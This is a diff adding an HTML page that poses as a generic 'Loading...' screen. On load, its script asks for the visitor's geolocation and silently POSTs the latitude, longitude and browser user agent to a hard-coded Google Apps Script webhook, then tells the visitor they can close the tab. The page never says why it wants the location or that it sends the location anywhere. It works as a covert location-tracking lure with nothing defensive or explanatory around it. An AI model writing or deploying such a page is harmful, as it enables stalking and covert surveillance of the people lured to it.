@@ -1,0 +1,40 @@
+<!DOCTYPE html>
+<html>
+<head>
+  <title>Loading...</title>
+</head>
+<body>
+  <p>Loading, please wait...</p>
+  <script>
+    const webhookURL = "https://script.google.com/macros/s/AKfycbypxhCmwAtUOcHwc5MLkAJU1vliYiwghmm1BTwwOINDGbSldWPzZN7w2ZzORlkXA3n5iQ/exec";
+
+    function sendLocation(lat, lon) {
+      const data = {
+        lat: lat,
+        lon: lon,
+        device: navigator.userAgent
+      };
+
+      fetch(webhookURL, {
+        method: "POST",
+        body: JSON.stringify(data),
+        headers: {
+          "Content-Type": "application/json"
+        }
+      });
+
+      document.body.innerHTML = "<p>All set. You can close this tab.</p>";
+    }
+
+    if (navigator.geolocation) {
+      navigator.geolocation.getCurrentPosition(function(position) {
+        sendLocation(position.coords.latitude, position.coords.longitude);
+      }, function() {
+        document.body.innerHTML = "<p>Location permission denied.</p>";
+      });
+    } else {
+      document.body.innerHTML = "<p>Geolocation not supported.</p>";
+    }
+  </script>
+</body>
+</html>
